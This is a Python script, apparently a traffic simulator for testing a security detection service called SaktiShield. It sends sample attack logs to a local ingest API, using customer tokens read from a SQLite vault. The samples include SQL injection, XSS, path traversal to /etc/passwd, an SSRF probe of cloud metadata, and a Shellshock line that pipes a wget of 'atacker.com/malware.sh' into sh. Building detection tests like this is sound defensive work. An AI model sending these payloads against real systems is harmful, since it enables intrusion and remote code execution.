# simulate_traffic.py
import sqlite3
import os
import requests
import random

API_URL = "http://localhost:8000/api/v1/ingest"
DB_PATH = "security_vault.db"  # Conexión directa al vault local de tu Mac

# 💥 VECTORES DE ATAQUE COMPLETOS PARA LA SIMULACIÓN
PAYLOADS_ATAQUE = {
    "1": {
        "tipo": "Brute Force Attack",
        "log": "2026-06-08 21:05:12 - user=admin - ip=198.51.100.45 - STATUS: FAILED LOGIN - Attempt 15/15"
    },
    "2": {
        "tipo": "SQL Injection (SQLi)",
        "log": "GET /api/v1/products?id=1' UNION SELECT username, password FROM sakti_users-- HTTP/1.1"
    },
    "3": {
        "tipo": "Cross-Site Scripting (XSS)",
        "log": "POST /comments HTTP/1.1 - body=<script>alert('XSS_SaktiShield_Test')</script>"
    },
    "4": {
        "tipo": "Directory Traversal",
        "log": "GET /static/../../../../etc/passwd HTTP/1.1 - Host: security-target.com"
    },
    "5": {
        "tipo": "Remote Code Execution (RCE) - Shellshock",
        # Incluimos metacaracteres claros (; |) y comandos en minúsculas (whoami, id, wget)
        "log": "GET /cgi-bin/stats.cgi HTTP/1.1 - Host: vulnerable.com - User-Agent: () { :;}; /bin/bash -c 'whoami; id; wget http://atacker.com/malware.sh | sh'"
    },
    # ... resto de payloads ...
    "6": {
        "tipo": "SSRF Attack",
        "log": "GET /fetch?url=http://169.254.169.254/latest/meta-data/local-ipv4 HTTP/1.1"
    },
    "7": {
        "tipo": "Tráfico Legítimo (Rutinario)",
        "log": "GET /index.html HTTP/1.1 - Host: website.com - Status 200 OK - User-Agent: Mozilla/5.0"
    }
}

def obtener_clientes_desde_vault():
    """Lee el archivo SQLite en caliente para obtener los inquilinos y tokens vigentes"""
    if not os.path.exists(DB_PATH):
        print(f"❌ Error: No se detecta el archivo '{DB_PATH}' en este directorio.")
        return {}
        
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    clientes_dict = {}
    
    try:
        # Solo traemos los clientes con estatus ACTIVO
        cursor.execute("SELECT id, empresa_name, api_key FROM sakti_customers WHERE estatus = 'ACTIVO';")
        rows = cursor.fetchall()
        
        # Mapeamos un índice visual (1, 2, 3...) para el menú interactivo
        for index, row in enumerate(rows, start=1):
            clientes_dict[str(index)] = {
                "id_db": row[0],
                "nombre": row[1],
                "token": row[2]
            }
    except Exception as e:
        print(f"❌ Error al consultar el Vault SQLite: {e}")
    finally:
        conn.close()
        
    return clientes_dict

def enviar_trafico(token_cliente, nombre_cliente, payload_log, tipo_ataque):
    headers = {
        "X-Sakti-Token": token_cliente,
        "Content-Type": "application/json"
    }
    
    ip_ficticia = f"{random.randint(50,220)}.{random.randint(10,250)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    data = {
        "client_ip": ip_ficticia,
        "log_entry": payload_log
    }
    
    print(f"\n📡 [DISPARANDO] {tipo_ataque} contra {nombre_cliente}...")
    try:
        response = requests.post(API_URL, json=data, headers=headers)
        if response.status_code == 200:
            res_json = response.json()
            print(f"✅ API RESPUESTA (200 OK):")
            print(f"   • Cliente Autenticado: {res_json.get('client')}")
            print(f"   • Core Decision: {res_json.get('decision_core', 'N/A')}")
            print(f"   • Mensaje: {res_json.get('message')}")
        else:
            print(f"❌ Error en la API Ingest ({response.status_code}): {response.text}")
    except Exception as e:
        print(f"❌ Error de conexión de red con el backend: {e}")

def menu():
    while True:
        # 🔄 Consultamos la DB en cada iteración del bucle principal
        clientes_vigentes = obtener_clientes_desde_vault()
        
        print("\n" + "="*60)
        print("🛡️  SAKTISHIELD — SIMULADOR COMPLETO DE CIBERAMENAZAS 🛡️")
        print("="*60)
        print("Selecciona el Cliente Objetivo (Leyendo Vault en Vivo):")
        
        if not clientes_vigentes:
            print("⚠️  No hay clientes activos registrados en security_vault.db")
            print(" [4] Salir")
        else:
            for opcion, datos in clientes_vigentes.items():
                print(f" [{opcion}] {datos['nombre']}")
            # Dejamos una opción de salida dinámica calculando el último índice + 1
            opcion_salir = str(len(clientes_vigentes) + 1)
            print(f" [{opcion_salir}] Salir")
        
        opcion_cliente = input("\n👉 Elige una opción: ").strip()
        
        if not clientes_vigentes and opcion_cliente == "4":
            break
        elif clientes_vigentes and opcion_cliente == opcion_salir:
            print("👋 Cerrando el simulador de tráfico.")
            break
            
        if opcion_cliente not in clientes_vigentes:
            print("❌ Opción inválida. Intenta de nuevo.")
            continue
            
        cliente_elegido = clientes_vigentes[opcion_cliente]
        
        print("\nSelecciona el Vector de Ataque a simular:")
        for k, v in PAYLOADS_ATAQUE.items():
            print(f" [{k}] {v['tipo']}")
            
        opcion_payload = input("\n👉 Elige el vector (1-7): ").strip()
        if opcion_payload not in PAYLOADS_ATAQUE:
            print("❌ Vector inválido. Operación cancelada.")
            continue
            
        payload_elegido = PAYLOADS_ATAQUE[opcion_payload]
        
        # Lanzar la telemetría controlada usando el token real extraído de la DB
        enviar_trafico(
            token_cliente=cliente_elegido["token"],
            nombre_cliente=cliente_elegido["nombre"],
            payload_log=payload_elegido["log"],
            tipo_ataque=payload_elegido["tipo"]
        )
        print("="*60)

if __name__ == "__main__":
    menu()